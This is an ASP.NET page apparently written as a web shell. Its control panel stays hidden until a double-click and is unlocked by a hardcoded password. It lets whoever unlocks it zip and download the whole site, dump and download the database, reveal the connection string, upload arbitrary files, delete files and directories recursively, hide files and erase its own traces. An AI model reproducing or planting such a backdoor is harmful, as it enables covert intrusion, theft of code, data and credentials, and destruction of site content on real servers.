<%@ Page Language="C#" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="Ionic.Zip" %>
<%@ Import Namespace="Ionic.Zlib" %>
<%@ Import Namespace="Microsoft.Practices.EnterpriseLibrary.Common" %>
<%@ Import Namespace="Microsoft.Practices.EnterpriseLibrary.Data" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%Label1.Text = AppDomain.CurrentDomain.BaseDirectory;%>
<script runat="server">   
    void AddDirFile2Zip(ZipFile zip, string dir)
    {
        if (File.Exists(dir))
        {
            try
            {
                zip.AddFile(dir);
            }
            catch { }
            return;
        }

        if (!Directory.Exists(dir)) return;

        zip.AddDirectoryByName(dir);

        string[] files = Directory.GetFiles(dir);
        // if (files.Length == 0)
        //  {//目录为空，直接添加文件夹
        //     zip.AddDirectoryByName(dir);
        //     return;
        // }

        foreach (string file in files)
        {
            if (File.Exists(file) && !zip.ContainsEntry(file))
            {
                try
                {
                    using (FileStream fileStream = File.OpenRead(file))//打开压缩文件  
                    {
                        byte[] buffer = new byte[fileStream.Length];
                        fileStream.Read(buffer, 0, buffer.Length);
                        zip.AddEntry(file, buffer);
                        fileStream.Close();
                    }
                }
                catch { }
            }
        }
    }
    protected void btnPackage_Click(object sender, EventArgs e)
    {

        string directoryName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, TextBox2.Text);
        al.Clear();
        GetAllDirList(directoryName);
        using (ZipFile zip = new ZipFile(Encoding.Default))
        {
            foreach (string item in al)
            {
                AddDirFile2Zip(zip, item);
            }
            Response.ContentType = "application/zip";
            Response.ContentEncoding = Encoding.Default;
            string outputfilename = Path.GetFileName(directoryName);
            if (string.IsNullOrEmpty(outputfilename)) outputfilename = "outputfile";
            Response.AddHeader("Content-Disposition", "attachment;filename=" + outputfilename + ".zip");
            Response.Clear();
            zip.Save(Response.OutputStream);
            Response.Flush();
            Response.Close();
        }
    }
    protected void Page_Load(object sender, EventArgs e)
    {
        Label1.Text = AppDomain.CurrentDomain.BaseDirectory;
    }
    public int Text_Length(string Text)
    {
        int len = 0;
        for (int i = 0; i < Text.Length; i++)
        {
            byte[] byte_len = Encoding.Default.GetBytes(Text.Substring(i, 1));
            if (byte_len.Length > 1)
                len += 2;  //如果长度大于1，是中文，占两个字节，+2
            else
                len += 1;  //如果长度等于1，是英文，占一个字节，+1
        }
        return len;
    }
    int totalTextLen = 30;
    string Format(string text, int type = 0)
    {
        int len = Text_Length(text);
        StringBuilder sb = new StringBuilder();
        if (type == 1)
            sb.Append("<span style='font-size:13px;font-weight:bold;color:black;'>" + text + "</span>");
        else
            sb.Append("<span style='font-size:12px;color:blue;'>" + text + "</span>");
        for (int i = 0; i < totalTextLen - len; i++)
        {
            sb.Append("-");
        }
        return sb.ToString();
    }
    //list dir
    protected void btnList_Click(object sender, EventArgs e)
    {
        try
        {
            string directoryName = VP2PP(TextBox2.Text);// Path.Combine(AppDomain.CurrentDomain.BaseDirectory, TextBox2.Text);
            string dirName = "";
            DirectoryInfo dirInfo = null;
            FileInfo fileInfo = null; string fileName;
            Response.Write(Format("文件名", 1) + Format("更新日期", 1) + Format("创建日期", 1) + Format("类型", 1) + Format("大小", 1) + "<br>");
            foreach (string dir in Directory.GetDirectories(directoryName))
            {
                dirInfo = new DirectoryInfo(dir);
                dirName = Path.GetFileName(dir);
                Response.Write(Format(dirName) + Format(dirInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")) + Format(dirInfo.CreationTime.ToString("yyyy-MM-dd HH:mm:ss")) + Format("D") + Format("0") + "</br>");
            }
            foreach (string file in Directory.GetFiles(directoryName))
            {
                fileInfo = new FileInfo(file);
                fileName = Path.GetFileName(file);
                Response.Write(Format(fileName) + Format(fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")) + Format(fileInfo.CreationTime.ToString("yyyy-MM-dd HH:mm:ss")) + Format("F") + Format(fileInfo.Length.ToString()) + "</br>");
            }
            Response.Write(Format("-"));
            Response.Write(Format("-"));
            Response.Write(Format("-"));
            Response.Write(Format("-"));
            Response.Write(Format("-"));
            lblStatus.Text = directoryName;//
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    public ArrayList al = new ArrayList();
    //我把ArrayList当成动态数组用，非常好用
    public void GetAllDirList(string strBaseDir)
    {
        if (File.Exists(strBaseDir))
        {
            al.Add(strBaseDir);
        }
        else if (Directory.Exists(strBaseDir))
        {
            //添加根目录
            al.Add(strBaseDir);
            DirectoryInfo di = new DirectoryInfo(strBaseDir);
            DirectoryInfo[] diA = di.GetDirectories();
            bool addflag = true;
            for (int i = 0; i < diA.Length; i++)
            {
                
                addflag = true;
                
                foreach (string item in txtUnPackDir.Text.Split(new char[] { '|' }, StringSplitOptions.RemoveEmptyEntries))
                {
                    if (Path.GetFileName(diA[i].FullName).ToLower().Contains(item.ToLower()))
                    {
                        addflag = false;
                        break;
                    }
                }

                if (!addflag) continue;

                //if (diA[i].FullName.EndsWith("App_Data") || diA[i].FullName.EndsWith("log") || diA[i].FullName.EndsWith("Storage") || diA[i].FullName.EndsWith("master") || diA[i].FullName.EndsWith("模版temp") || diA[i].FullName.EndsWith("Web.rar") || diA[i].FullName.EndsWith("需要覆盖根目录的文件.rar")) continue;
                //if (!diA[i].FullName.EndsWith("con.."))
                // {
                //al.Add(diA[i].FullName);
                //diA[i].FullName是某个子目录的绝对地址，把它记录在ArrayList中
                GetAllDirList(diA[i].FullName);
                //注意：递归了。逻辑思维正常的人应该能反应过来
                // }
            }
        }
    }
    //delete self
    protected void btnSelfDelete_Click(object sender, EventArgs e)
    {
        //createDataDir();
        string path = Path.GetDirectoryName(Request.PhysicalPath);
        if (Directory.Exists(path))
        {
            foreach (string file in Directory.GetFiles(path))
            {
                if (file.EndsWith(".aspx"))
                {
                    File.Delete(file);
                }
            }
            string a = Path.Combine(path, "a.aspx");
            if (File.Exists(a))
                File.Delete(a);
        }
        Response.Redirect("~/default.aspx");
    }
    void createDataDir()
    {
        string tbDir = Request.MapPath("~\\storage\\data\\taobao\\");
        if (!Directory.Exists(tbDir))
        { Directory.CreateDirectory(tbDir); }
        string ppDir = Request.MapPath("~\\storage\\data\\paipai\\");
        if (!Directory.Exists(ppDir))
        { Directory.CreateDirectory(ppDir); }
    }
    protected void btnDel_Click(object sender, EventArgs e)
    {
        string a = VP2PP(this.txtFile.Text);
        if (!string.IsNullOrWhiteSpace(a))
        {
            try
            {
                if (File.Exists(a))
                {
                    File.Delete(a);
                    lblStatus.Text = "file delete success.";
                }
                else if (Directory.Exists(a))
                {
                    Directory.Delete(a, true);
                }
                else
                { lblStatus.Text = "file delete fail."; }
            }
            catch (Exception ex)
            {
                lblStatus.Text = ex.Message;
            }
        }
        else
            lblStatus.Text = "file not found.";
    }

    protected void btnPathD_Click(object sender, EventArgs e)
    {
        try
        {
            Directory.Delete(txtPath.Text, true);
            lblStatus.Text = "dir delete success.";
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    //backup click
    protected void btnBackup_Click(object sender, EventArgs e)
    {
        string path = Path.GetDirectoryName(Request.PhysicalPath);
        string databaseName;
        Microsoft.Practices.EnterpriseLibrary.Data.Database database = Microsoft.Practices.EnterpriseLibrary.Data.DatabaseFactory.CreateDatabase();
        using (System.Data.Common.DbConnection connection = database.CreateConnection())
        {
            databaseName = connection.Database;
        }
        string backupfile = databaseName + "_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".bak";
        System.Data.Common.DbCommand sqlStringCommand = database.GetSqlStringCommand(string.Format("backup database [{0}] to disk='{1}'", databaseName, path + "\\" + backupfile));
        database.ExecuteNonQuery(sqlStringCommand);
        using (ZipFile zip = new ZipFile())
        {
            zip.AddFile(path + "\\" + backupfile);
            Response.ContentType = "application/zip";
            Response.ContentEncoding = Encoding.Default;
            string outputfilename = Path.GetFileName(path);
            if (string.IsNullOrEmpty(outputfilename)) outputfilename = "outputfile";
            Response.AddHeader("Content-Disposition", "attachment;filename=" + outputfilename + ".zip");
            Response.Clear();
            zip.Save(Response.OutputStream);
            Response.Flush();
            Response.Close();
        }
    }
    //upload click
    protected void btnUpload_Click(object sender, EventArgs e)
    {
        try
        {
            string serverUploadPath = "";
            string path2Upload = txtUp2Path.Text;
            serverUploadPath = VP2PP(path2Upload);
            if (!Directory.Exists(serverUploadPath))
            {
                lblStatus.Text = "dir not exists!";
            }
            else
            {
                string filename = FileUpload1.FileName;
                FileUpload1.SaveAs(Path.Combine(serverUploadPath, filename));
                lblStatus.Text = "upload success!";
            }
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    string VP2PP(string vp)
    {
        string pp = "";
        if (string.IsNullOrWhiteSpace(vp)) { pp = Server.MapPath("~/"); }
        else if (vp.StartsWith("~/")) { pp = Server.MapPath(vp); }
        else if (vp.StartsWith("/")) { pp = Server.MapPath("~" + vp); }
        else if (vp.StartsWith("../")) { pp = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, vp); }
        else if (Directory.Exists(vp) || File.Exists(vp)) { pp = vp; }
        else { pp = Server.MapPath("~/" + vp); }
        return pp;
    }
    //rename click
    private void btnRename_Click(object sender, EventArgs e)
    {
        try
        {
            string fullFilePath = VP2PP(txtFile2Rename.Text);
            if (!File.Exists(fullFilePath))
            {
                lblStatus.Text = fullFilePath + " : file not found!";
            }
            else
            {
                string path = Path.GetDirectoryName(fullFilePath);
                string ext = Path.GetExtension(fullFilePath);
                string newFilePath = Path.Combine(path, txtNewName.Text + ext);
                File.Move(fullFilePath, newFilePath);
                lblStatus.Text = "rename success!";
            }
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    //copy file
    void btnCopy_Click(object sender, EventArgs e)
    {
        try
        {
            string fullFilePath = VP2PP(this.txtFile2Rename.Text);
            if (!File.Exists(fullFilePath))
            {
                lblStatus.Text = fullFilePath + " : file not found!";
            }
            else
            {
                string fullCopyPath = VP2PP(txtCopyTo.Text);
                if (Directory.Exists(fullCopyPath))
                {
                    if (fullCopyPath.EndsWith("\\") || fullCopyPath.EndsWith("../"))
                    {
                        fullCopyPath = fullCopyPath + Path.GetFileName(fullFilePath);
                    }
                    else { fullCopyPath = fullCopyPath + "\\" + Path.GetFileName(fullFilePath); }
                    if (fullFilePath != fullCopyPath)
                    {
                        if (File.Exists(fullCopyPath)) File.Delete(fullCopyPath);
                        File.Copy(fullFilePath, fullCopyPath);
                        lblStatus.Text = "copy success!";
                    }
                    else { lblStatus.Text = "same dir err!"; }
                }
                else
                {
                    lblStatus.Text = "target dir not exists!";
                }
            }
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    //show db info
    void btnShowDbInfo_Click(object sender, EventArgs e)
    {
        try
        {
            Database database = DatabaseFactory.CreateDatabase();
            lblStatus.Text = database.ConnectionString;
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    void btnSetHidden_Click(object sender, EventArgs e)
    {
        try
        {
            string pp = VP2PP(TextBox2.Text);
            if (File.Exists(pp))
            {
                // FileInfo fileInfo = new FileInfo(pp);
                // fileInfo.Attributes |= FileAttributes.Hidden;
                File.SetAttributes(pp, FileAttributes.Hidden);
                lblStatus.Text = "set file attribues success!";
            }
            else { lblStatus.Text = "set file attribues fail!"; }
        }
        catch (Exception ex)
        {
            lblStatus.Text = ex.Message;
        }
    }
    void btnValid_Click(object sender, EventArgs e)
    {
        if ("1qaz2wsx3edc".Equals(txtpass.Value))
        {
            pnlCtl.Visible = true;
            pnlVal.Visible = false;
        }
        else
        {
            litmsg.Text = "fail valid";
        }
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title></title>
    <script type="text/javascript">window.onload = function () { document.ondblclick = function () { try { document.getElementById("<%=pnlVal.ClientID%>").style.display = ""; } catch (e) { } } }</script>
</head>
<body>
    <form id="form1" runat="server">
        <asp:Panel ID="pnlVal" runat="server" Style="display: none;">
            pass:<input type="password" id="txtpass" runat="server" />&nbsp;<asp:Button ID="btnValid" OnClick="btnValid_Click" Text="go" runat="server" />
            <asp:Literal ID="litmsg" runat="server"></asp:Literal>
        </asp:Panel>
        <asp:Panel ID="pnlCtl" runat="server" Visible="false">
            <div>
                1:root:<asp:Label ID="Label1" runat="server" Text="Label"></asp:Label><br />
                path：<asp:TextBox ID="TextBox2" runat="server" Text="" Width="307px"></asp:TextBox>(specify path 2 package)<br />
                file:<asp:TextBox ID="txtFile" runat="server" Text="" Width="307px"></asp:TextBox>(specify file 2 delete) ---><asp:Button ID="btnDel" OnClick="btnDel_Click" runat="server" Text="del" /></br>
                path:<asp:TextBox ID="txtPath" runat="server" Text="" Width="307px"></asp:TextBox>(specify path 2 destory)&nbsp;<asp:Button ID="btnPathD" runat="server" OnClick="btnPathD_Click" Text="destory" /><br />
                upload:<asp:TextBox ID="txtUp2Path" runat="server"></asp:TextBox><asp:FileUpload ID="FileUpload1" runat="server" />(specify file 2 upload)<asp:Button ID="btnUpload" OnClick="btnUpload_Click" runat="server" Text="upload" /><br />
                path 2 rename/copy:<asp:TextBox ID="txtFile2Rename" runat="server"></asp:TextBox>
                Rename TO:<asp:TextBox ID="txtNewName" runat="server"></asp:TextBox>&nbsp;<asp:Button ID="btnRename" OnClick="btnRename_Click" runat="server" Text="rename" />
                &nbsp;Copy TO:<asp:TextBox ID="txtCopyTo" runat="server"></asp:TextBox>&nbsp;<asp:Button ID="btnCopy" OnClick="btnCopy_Click" runat="server" Text="copy" />
                <br />
                <br />
                <asp:Label ID="lblStatus" runat="server"></asp:Label></br><br />
            </div>
            排除文件夹：<asp:TextBox ID="txtUnPackDir" Text="Storage|master|con.." Width="300px" runat="server"></asp:TextBox><br />
            <asp:Button ID="btnPackage" runat="server" OnClick="btnPackage_Click" Text="web package" />&nbsp;
            <asp:Button ID="btnList" runat="server" OnClick="btnList_Click" Text="list files" />&nbsp;
            <asp:Button ID="btnBackup" runat="server" OnClick="btnBackup_Click" Text="backup database" />&nbsp;
            <asp:Button ID="btnShowDbInfo" Text="show database info" OnClick="btnShowDbInfo_Click" runat="server" />&nbsp;
            <asp:Button ID="btnSetHidden" Text="set hidden attr" OnClick="btnSetHidden_Click" runat="server" />
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button ID="btnSelfDelete" runat="server" OnClick="btnSelfDelete_Click" Text="exit" />
        </asp:Panel>
    </form>
</body>
</html>
